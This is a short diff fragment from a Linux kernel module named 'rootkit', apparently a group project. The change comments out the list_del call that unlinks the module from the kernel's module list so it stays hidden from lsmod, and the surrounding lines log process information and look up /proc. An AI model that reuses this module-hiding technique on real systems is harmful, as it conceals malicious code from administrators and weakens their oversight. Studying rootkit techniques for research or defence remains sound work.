@@ -349,8 +349,8 @@ static int __init rootkit_init(void){
 	// End Brendan
 
 	//Start Carlos
-	module_list = THIS_MODULE->list.prev;//moves pointer
-    	list_del(&THIS_MODULE->list);//del the current pointer. Removes module from insmod.
+	//module_list = THIS_MODULE->list.prev;//moves pointer
+    	//list_del(&THIS_MODULE->list);//del the current pointer. Removes module from insmod.
 	printk(KERN_INFO "@$@?: The process is \"%s\" (pid %i)\n", current->comm, current->pid);
 	if(kern_path("/proc", 0, &p)){
         	printk(KERN_INFO "@%@?: System forced to exit becaus path for /proc not found");
